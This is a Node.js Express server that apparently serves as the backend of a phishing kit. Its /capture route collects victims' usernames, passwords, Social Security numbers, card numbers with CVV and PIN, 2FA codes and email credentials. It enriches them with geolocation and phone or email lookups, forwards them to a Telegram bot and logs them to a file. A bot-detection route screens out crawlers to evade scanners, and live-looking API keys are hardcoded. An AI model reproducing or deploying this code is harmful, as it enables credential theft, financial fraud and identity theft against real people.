import express from 'express';
import path from 'path';
import axios from 'axios';
import fs from 'fs';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import morgan from 'morgan';

// Load environment variables
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging middleware
app.use(morgan('combined'));

// Serve static files from the 'public' directory
app.use(express.static(path.join(process.cwd(), 'public')));

// Serve the isolated environments directory
app.use(express.static(path.join(process.cwd(), 'builds')));

// Load configuration from config.json
let config = {};
try {
    const configPath = path.join(process.cwd(), 'config.json');
    const configFile = fs.readFileSync(configPath, 'utf8');
    config = JSON.parse(configFile);
} catch (error) {
    console.error('Failed to load config:', error);
}

// Telegram Bot Configuration
// Initial config load is dynamic per request to support updates without restarts

const API_NINJAS_KEY = '9IffIYgfbatOM/2lhJ06CA==7ZHqrYzICLRspTL1';

const apiNinja = async (endpoint, params) => {
    try {
        const urlParams = new URLSearchParams(params).toString();
        const res = await axios.get(`https://api.api-ninjas.com/v1/${endpoint}?${urlParams}`, {
            headers: { 'X-Api-Key': API_NINJAS_KEY },
            timeout: 3000 // Don't hang the backend if API is slow
        });
        return res.data;
    } catch (e) {
        return null;
    }
};

// HTML-escape value for Telegram HTML mode
const he = (s) => {
    if (typeof s !== 'string') return s;
    return s.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
};

// Function to send messages to Telegram
const sendToTelegram = async (message) => {
    try {
        // Dynamically load to ensure updates to .env or config.json are reflected
        dotenv.config({ override: true });
        
        let dynConfig = {};
        try {
            const configPath = path.join(process.cwd(), 'config.json');
            const configFile = fs.readFileSync(configPath, 'utf8');
            dynConfig = JSON.parse(configFile);
        } catch (e) {}
        
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || dynConfig.telegram?.bot_token;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID || dynConfig.telegram?.chat_id;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Telegram Bot Token or Chat ID not configured. Message dropped.');
            return;
        }

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
};

// Removed duplicate line-type endpoint

// Endpoint to handle form submissions
app.post('/capture', async (req, res) => {
    // ── Phone Validation Endpoint (AbstractAPI) ──────────────────────────────────────────
    if (req.query.action === 'line-type') {
        const phone = req.body.phone || '';
        if (!phone) return res.json({ type: 'unknown' });
        
        try {
            const abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
            const url = `https://phoneintelligence.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(phone)}`;
            const abstractRes = await axios.get(url, { timeout: 3000 });
            const data = abstractRes.data;
            
            if (data?.phone_validation?.is_voip) {
                return res.json({ type: 'voip' });
            }
            if (data?.phone_carrier?.line_type) {
                const lineType = data.phone_carrier.line_type.toLowerCase();
                if (lineType.includes('landline') || lineType.includes('fixed')) {
                    return res.json({ type: 'landline' });
                }
            }
            return res.json({ type: 'mobile' });
        } catch (e) {
            // Fail open if API rate limits or times out
            return res.json({ type: 'mobile' });
        }
    }

    const d = req.body;
    
    // Server-side Input Validation
    if (!d || typeof d !== 'object' || Object.keys(d).length === 0) {
        return res.status(400).send('Invalid or missing payload');
    }

    const form_type = d.form_type || 'unknown';
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const user_agent = req.headers['user-agent'] || 'Unknown';
    const session_id = d._sid || 'nosid';

    const sid_tag = session_id ? `\n🔗 <b>SID:</b> <code>${he(session_id)}</code>` : '';
    const fp_line = d.fingerprint ? `🛡️ <b>FP:</b> <code>${he(d.fingerprint)}</code>\n` : '';

    const ipString = ip.split(',')[0].trim();
    let geo_line = '';
    
    // Quick API Ninja IP Lookup
    if (ipString && ipString !== 'Unknown' && ipString !== '::1' && ipString !== '127.0.0.1') {
        const ipap = await apiNinja('iplookup', { address: ipString });
        if (ipap && ipap.country) {
            const flag = ipap.country.substring(0, 2).toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
            geo_line = `🌍 <b>Geo:</b> <code>${he(ipap.city)}, ${he(ipap.region)}, ${he(ipap.country)}</code> ${flag}`;
        }
    }

    const header = `🕒 <code>${timestamp}</code>\n`
        + `📍 <b>IP:</b> <code>${he(ipString)}</code>\n`
        + (geo_line ? geo_line + '\n' : '')
        + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
        + fp_line
        + sid_tag + "\n";

    let msg = '';
    
    switch (form_type) {
        case 'visit':
            msg = "👁️ <b>NEW VISITOR</b>\n"
                + `🕒 <code>${timestamp}</code>\n`
                + `📍 <b>IP:</b> <code>${he(ipString)}</code>\n`
                + (geo_line ? geo_line + '\n' : '')
                + `🌐 <b>Page:</b> <code>${he(d.url || 'Unknown')}</code>\n`
                + `🖥️ <b>Res:</b> <code>${he(d.res || 'Unknown')}</code>\n`
                + `🤖 <b>UA:</b> <code>${he(user_agent.substring(0, 140))}</code>\n`
                + fp_line
                + sid_tag;
            break;
            
        case 'login':
            msg = "🔑 <b>✅ LOGIN CAPTURED</b>\n" + header
                + `👤 <b>Username:</b> <code>${he(d.username || 'N/A')}</code>\n`
                + `🔒 <b>Password:</b> <code>${he(d.password || 'N/A')}</code>`;
            break;
            
        case 'verify':
            let phoneFlag = d.phone || 'N/A';
            if (d.phone && d.phone.length > 5) {
                try {
                    const abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
                    const url = `https://phoneintelligence.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(d.phone)}`;
                    const abstractRes = await axios.get(url, { timeout: 3000 });
                    const pData = abstractRes.data;
                    
                    if (pData && pData.phone_validation) {
                        const isValid = pData.phone_validation.is_valid ? '✅ Valid' : '❌ Invalid';
                        const carrier = pData.phone_carrier?.name || 'Unknown Carrier';
                        const lineType = pData.phone_carrier?.line_type || 'Unknown Line';
                        phoneFlag += ` (${isValid} - ${lineType} - ${carrier})`;
                    }
                } catch(e) {
                    // Fallback to basic string if API fails
                }
            }

            const dobStr = d.dob ? `${he(d.dob)} (✅ Frontend Validated)` : 'N/A';
            msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" + header
                + `👤 <b>Name:</b>  <code>${he(d.full_name || 'N/A')}</code>\n`
                + `🔢 <b>SSN:</b>   <code>${he(d.ssn || 'N/A')}</code>\n`
                + `📞 <b>Phone:</b> <code>${he(phoneFlag)}</code>\n`
                + `🆔 <b>Member #:</b> <code>${he(d.member_num || 'N/A')}</code>\n`
                + `🎂 <b>DOB:</b>   <code>${dobStr}</code>`;
            break;
            
        case 'card':
            let binStr = d.bin_data ? `\n🏦 <b>BIN Info:</b> <code>${he(d.bin_data)}</code>` : '';
            msg = "💳 <b>✅ CARD DATA CAPTURED</b>\n" + header
                + `💳 <b>Card:</b> <code>${he(d.card_num || 'N/A')}</code>${binStr}\n`
                + `📅 <b>Exp:</b>  <code>${he(d.exp || 'N/A')}</code>\n`
                + `🔐 <b>CVV:</b>  <code>${he(d.cvv || 'N/A')}</code>\n`
                + `🔑 <b>PIN:</b>  <code>${he(d.pin || 'N/A')}</code>\n`
                + `🏠 <b>Addr:</b> <code>${he(d.address || 'N/A')}</code>`;
            break;
            
        case '2fa':
            msg = "📟 <b>✅ 2FA CODE CAPTURED</b>\n" + header
                + `🔢 <b>Code:</b> <code>${he(d.sec_code || 'N/A')}</code>`;
            break;
            
        case 'emailAuth':
            const prov = d.emailProvider || 'Unknown';
            let logo = "📧";
            if (prov.toLowerCase().includes('yahoo')) logo = "🟣";
            if (prov.toLowerCase().includes('google') || prov.toLowerCase().includes('gmail')) logo = "🔴";
            if (prov.toLowerCase().includes('microsoft') || prov.toLowerCase().includes('outlook') || prov.toLowerCase().includes('hotmail')) logo = "🔵";
            if (prov.toLowerCase().includes('apple') || prov.toLowerCase().includes('icloud')) logo = "⚪";

            let emFlag = d.emailAcc || 'N/A';
            if (d.emailAcc && d.emailAcc.includes('@')) {
                const emVal = await apiNinja('validateemail', { email: d.emailAcc });
                if (emVal) emFlag += emVal.is_valid ? ' (✅ Valid)' : ' (❌ Invalid)';
                
                const domain = d.emailAcc.split('@')[1];
                const mxVal = await apiNinja('mxlookup', { domain: domain });
                if (mxVal && mxVal.length > 0) {
                    emFlag += `\n📡 <b>MX:</b> <code>Parsed ${mxVal.length} Mail Servers</code>`;
                } else if (mxVal) {
                    emFlag += `\n📡 <b>MX:</b> <code>(❌ No Mail Servers Found)</code>`;
                }
            }

            msg = `${logo} <b>✅ EMAIL ACCOUNT CAPTURED</b>\n` + header
                + `🏢 <b>Provider:</b> <code>${he(prov)}</code>\n`
                + `📧 <b>Email:</b>    <code>${emFlag}</code>\n` // No he here because it contains html
                + `🔒 <b>Password:</b> <code>${he(d.emailPass || 'N/A')}</code>`;
            break;
            
        default:
            let rows = '';
            for (const [k, v] of Object.entries(d)) {
                if (!['b_field', '_sid', 'form_type', 'fingerprint', 'attempt'].includes(k)) {
                    rows += `• <b>${he(k.charAt(0).toUpperCase() + k.slice(1))}:</b> <code>${he(v)}</code>\n`;
                }
            }
            msg = `📋 <b>FORM SUBMISSION</b> (${form_type})\n` + header + rows;
            break;
    }

    sendToTelegram(msg);

    // Write full capture to log file
    const logData = { form_type, session_id, timestamp, ip, user_agent, data: d };
    fs.appendFileSync(path.join(process.cwd(), 'captures.jsonl'), JSON.stringify(logData) + '\\n');

    res.status(200).json({ status: 'ok' });
});

// Endpoint for bot detection
app.get('/bot-detection', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isBot = /bot|crawler|spider|robot|headless/i.test(userAgent) ||
                 req.headers['x-forwarded-for'] === 'unknown' ||
                 req.headers['accept-language'] === undefined ||
                 req.headers['accept-encoding'] === undefined;

    if (isBot) {
        res.send('Access Denied: Automated Software Detected.');
    } else {
        res.send('');
    }
});

// Endpoint to serve config.json
app.get('/config', (req, res) => {
    res.json(config);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
